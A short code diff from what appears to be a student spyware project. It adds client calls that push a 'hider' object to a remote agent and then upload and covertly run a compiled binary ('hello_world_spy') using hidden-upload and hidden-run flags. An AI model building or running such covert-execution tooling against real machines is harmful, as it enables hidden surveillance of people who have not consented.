@@ -10,10 +10,19 @@ PORT = 65432
 
 def main():
     agent = Agent(HOST, PORT)
+    targetHiderPath = "sendHiderTest.o"
     print(
         agent.write_file(
+            "/home/avner/Arazim-Projects-2024---spyware/hider",
+            targetHiderPath,
+        )
+    )
+    print(agent.hider_setup(targetHiderPath))
+    print(
+        agent.hidden_action_with_upload(
+            FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
             "/home/avner/Arazim-Projects-2024---spyware/src/ServerSpy/compiledAtHome.o",
-            "compiledAtHome.o",
+            "hello_world_spy",
         )
     )
 
